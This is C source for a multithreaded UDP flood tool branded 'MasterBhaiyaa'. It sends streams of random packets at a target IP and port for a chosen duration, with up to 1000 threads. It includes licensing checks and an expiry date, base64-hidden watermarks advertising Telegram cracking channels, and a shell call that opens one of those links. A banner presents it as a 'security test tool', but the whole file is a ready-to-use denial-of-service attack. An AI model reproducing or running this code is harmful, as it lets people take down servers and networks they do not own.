#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <signal.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <ctype.h>

#define DEFAULT_PAYLOAD_SIZE 64  // Adjusted to match approximate example size
#define BINARY_NAME "MasterBhaiyaa"
#define MAX_THREADS 1000 // Maximum thread count for safety
#define MAX_UDP_PAYLOAD 65507 // Maximum UDP payload size for IPv4
#define EXPIRATION_YEAR 2054
#define EXPIRATION_MONTH 11
#define EXPIRATION_DAY 1

volatile sig_atomic_t stop_flag = 0;

struct AttackConfig {
    char *ip; // Dynamic IP address
    int port;
    int duration;
    int payload_size;
    int thread_count;
};

// Base64 encoding function (from Code B)
void base64_encode(const unsigned char *data, char *encoded, size_t length) {
    const char *base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int i = 0, j = 0;
    unsigned char char_array_3[3], char_array_4[4];

    while (length--) {
        char_array_3[i++] = *(data++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; i < 4; i++) {
                encoded[j++] = base64_chars[char_array_4[i]];
            }
            i = 0;
        }
    }

    if (i) {
        for (int k = i; k < 3; k++) {
            char_array_3[k] = '\0';
        }
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;

        for (int k = 0; k < i + 1; k++) {
            encoded[j++] = base64_chars[char_array_4[k]];
        }
        while (i++ < 3) {
            encoded[j++] = '=';
        }
    }
    encoded[j] = '\0';
}

// Base64 decoding function (from Code B)
void base64_decode(const char *encoded, char *decoded) {
    const char *base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int i = 0, j = 0, in_len = strlen(encoded);
    unsigned char char_array_4[4], char_array_3[3];

    while (in_len-- && encoded[i] != '=' && (isalnum(encoded[i]) || encoded[i] == '+' || encoded[i] == '/')) {
        char_array_4[i++] = encoded[i++];
        if (i == 4) {
            for (i = 0; i < 4; i++) {
                char_array_4[i] = strchr(base64_chars, char_array_4[i]) - base64_chars;
            }
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; i < 3; i++) {
                decoded[j++] = char_array_3[i];
            }
            i = 0;
        }
    }

    if (i) {
        for (int k = i; k < 4; k++) {
            char_array_4[k] = 0;
        }
        for (int k = 0; k < i; k++) {
            char_array_4[k] = strchr(base64_chars, char_array_4[k]) - base64_chars;
        }
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (int k = 0; k < i - 1; k++) {
            decoded[j++] = char_array_3[k];
        }
    }
    decoded[j] = '\0';
}

// Check if port is blocked (from Code A)
int is_blocked_port(int port) {
    return (port >= 100 && port <= 999) || (port == 17500) || (port >= 20000 && port <= 20002);
}

// Signal handler for stopping (from Code A)
void handle_signal(int sig) {
    printf("\n[!] Interrupt received. Stopping attack...\n");
    stop_flag = 1;
}

// Check expiration date (combined from Code A and Code B)
int check_expiration() {
    struct tm expiry_date = {0};
    expiry_date.tm_year = EXPIRATION_YEAR - 1900;
    expiry_date.tm_mon = EXPIRATION_MONTH - 1;
    expiry_date.tm_mday = EXPIRATION_DAY;

    time_t now = time(NULL);
    time_t exp_time = mktime(&expiry_date);
    if (difftime(exp_time, now) < 0) {
        const char *encoded_error = "VGhpcyBmaWxlIGlzIGNsb3NlZCBAVklQTU9EU1hBRE1JTgpUaGlzIGlzIGZyZWUgdmVyc2lvbgpETSB0byBidXkKQFZJUE1PRFNYQURNSU4=";
        char decoded_error[512];
        base64_decode(encoded_error, decoded_error);
        fprintf(stderr, "╔════════════════════════════════════════╗\n");
        fprintf(stderr, "║ %s ║\n", decoded_error);
        fprintf(stderr, "╚════════════════════════════════════════╝\n");
        return 1;
    }
    return 0;
}

// Check binary name (from Code A)
void check_binary_name() {
    char exe_path[1024];
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (len != -1) {
        exe_path[len] = '\0';
        char *exe_name = strrchr(exe_path, '/');
        exe_name = exe_name ? exe_name + 1 : exe_path;
        if (strcmp(exe_name, BINARY_NAME) != 0) {
            fprintf(stderr, "╔════════════════════════════════════════╗\n");
            fprintf(stderr, "║         INVALID BINARY NAME!           ║\n");
            fprintf(stderr, "║    Binary must be named 'MasterBhaiyaa'║\n");
            fprintf(stderr, "╚════════════════════════════════════════╝\n");
            exit(EXIT_FAILURE);
        }
    }
}

// Validate IP address (from Code A)
int is_valid_ip(const char *ip) {
    struct in_addr addr;
    return inet_pton(AF_INET, ip, &addr) == 1;
}

// Open URL for expiration notice (from Code B)
void open_url() {
    const char *url = "https://t.me/SOULCRACKS";
    if (system("command -v xdg-open > /dev/null") == 0) {
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "xdg-open %s", url);
        system(cmd);
    } else if (system("command -v gnome-open > /dev/null") == 0) {
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "gnome-open %s", url);
        system(cmd);
    } else if (system("command -v open > /dev/null") == 0) {
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "open %s", url);
        system(cmd);
    } else if (system("command -v start > /dev/null") == 0) {
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "start %s", url);
        system(cmd);
    } else {
        fprintf(stderr, "Please visit: %s\n", url);
    }
}

// Generate random byte payload (modified for auto byte array like example)
void generate_payload(unsigned char *buffer, size_t size, unsigned int seed) {
    srand(seed);
    for (size_t i = 0; i < size; i++) {
        buffer[i] = (unsigned char)(rand() % 256); // Generate random byte (0-255)
    }
}

// UDP attack function (combined from both codes, modified for byte payload)
void *udp_attack(void *arg) {
    struct AttackConfig *config = (struct AttackConfig *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        fprintf(stderr, "[!] Thread %ld: Socket creation failed\n", pthread_self());
        return NULL;
    }

    // Enable SO_REUSEADDR (from Code A)
    int opt = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        fprintf(stderr, "[!] Thread %ld: Setsockopt failed\n", pthread_self());
        close(sock);
        return NULL;
    }

    // Bind to a random source port (from Code A)
    struct sockaddr_in src_addr = {0};
    src_addr.sin_family = AF_INET;
    src_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    srand(time(NULL) ^ pthread_self());
    src_addr.sin_port = htons((rand() % (65535 - 1024 + 1)) + 1024);
    if (bind(sock, (struct sockaddr *)&src_addr, sizeof(src_addr)) < 0) {
        perror("[!] Bind failed");
        close(sock);
        return NULL;
    }

    // Set up target address
    struct sockaddr_in target_addr = {0};
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons((uint16_t)config->port);
    target_addr.sin_addr.s_addr = inet_addr(config->ip);

    // Generate payload (random byte array)
    unsigned char *payload = (unsigned char *)malloc(config->payload_size);
    if (!payload) {
        fprintf(stderr, "[!] Thread %ld: Memory allocation failed\n", pthread_self());
        close(sock);
        return NULL;
    }
    generate_payload(payload, config->payload_size, time(NULL) ^ pthread_self());

    // Attack loop
    time_t start_time = time(NULL);
    while (difftime(time(NULL), start_time) < config->duration && !stop_flag) {
        ssize_t sent = sendto(sock, payload, config->payload_size, 0,
                              (struct sockaddr *)&target_addr, sizeof(target_addr));
        if (sent < 0) {
            perror("[!] Send failed");
            break;
        }
    }

    free(payload);
    close(sock);
    return NULL;
}

// Main function
int main(int argc, char *argv[]) {
    // Check arguments
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        return EXIT_FAILURE;
    }

    // Initialize configuration
    struct AttackConfig config;
    config.ip = strdup(argv[1]);
    if (!config.ip) {
        fprintf(stderr, "[!] Memory allocation for IP failed\n");
        return EXIT_FAILURE;
    }
    config.port = atoi(argv[2]);
    config.duration = atoi(argv[3]);
    config.thread_count = atoi(argv[4]);
    config.payload_size = DEFAULT_PAYLOAD_SIZE; // Fixed payload size for simplicity

    // Validate inputs
    if (!is_valid_ip(config.ip)) {
        fprintf(stderr, "[!] Invalid IP address: %s\n", config.ip);
        free(config.ip);
        return EXIT_FAILURE;
    }
    if (config.port <= 0 || config.port > 65535) {
        fprintf(stderr, "[!] Invalid port: %d\n", config.port);
        free(config.ip);
        return EXIT_FAILURE;
    }
    if (is_blocked_port(config.port)) {
        fprintf(stderr, "[!] Port %d is blocked!\n", config.port);
        free(config.ip);
        return EXIT_FAILURE;
    }
    if (config.duration <= 0) {
        fprintf(stderr, "[!] Invalid duration: %d\n", config.duration);
        free(config.ip);
        return EXIT_FAILURE;
    }
    if (config.thread_count <= 0 || config.thread_count > MAX_THREADS) {
        fprintf(stderr, "[!] Invalid thread count: %d (max %d)\n", config.thread_count, MAX_THREADS);
        free(config.ip);
        return EXIT_FAILURE;
    }
    if (config.payload_size <= 0 || config.payload_size > MAX_UDP_PAYLOAD) {
        fprintf(stderr, "[!] Invalid payload size: %d (max %d)\n", config.payload_size, MAX_UDP_PAYLOAD);
        free(config.ip);
        return EXIT_FAILURE;
    }

    // Check binary name and expiration
    check_binary_name();
    if (check_expiration()) {
        open_url();
        free(config.ip);
        return EXIT_FAILURE;
    }

    // Print watermark (from Code B)
    const char *encoded_watermark = "QHRlbGVncmFtIGNoYW5uZWwgQFNPVUxDUkFDS1MgVklQTU9EU1hBRE1JTiBUZXJtcyBvZiBzZXJ2aWNlIHVzZSBhbmQgbGVnYWwgY29uc2lkZXJhdGlvbnMu";
    char decoded_watermark[256];
    base64_decode(encoded_watermark, decoded_watermark);
    printf("╔════════════════════════════════════════╗\n");
    printf("║          MasterBhaiyaa PROGRAM         ║\n");
    printf("║         Copyright (c) 2024             ║\n");
    printf("║ %s ║\n", decoded_watermark);
    printf("╚════════════════════════════════════════╝\n\n");

    // Set up signal handler
    signal(SIGINT, handle_signal);

    // Print attack details
    printf("=====================================\n");
    printf("      Network Security Test Tool     \n");
    printf("=====================================\n");
    printf("Target: %s:%d\n", config.ip, config.port);
    printf("Duration: %d seconds\n", config.duration);
    printf("Threads: %d\n", config.thread_count);
    printf("Payload Size: %d bytes\n", config.payload_size);
    printf("=====================================\n\n");

    // Create threads
    pthread_t *threads = (pthread_t *)malloc(config.thread_count * sizeof(pthread_t));
    if (!threads) {
        fprintf(stderr, "[!] Thread allocation failed\n");
        free(config.ip);
        return EXIT_FAILURE;
    }

    for (int i = 0; i < config.thread_count; ++i) {
        if (pthread_create(&threads[i], NULL, udp_attack, &config) != 0) {
            fprintf(stderr, "[!] Thread %d creation failed\n", i + 1);
            continue;
        }
        printf("[+] Thread %d launched.\n", i + 1);
    }

    // Wait for threads to complete
    for (int i = 0; i < config.thread_count; ++i) {
        pthread_join(threads[i], NULL);
    }

    // Cleanup
    free(threads);
    free(config.ip);
    printf("\n[✔] Security test completed successfully.\n");

    return EXIT_SUCCESS;
}
```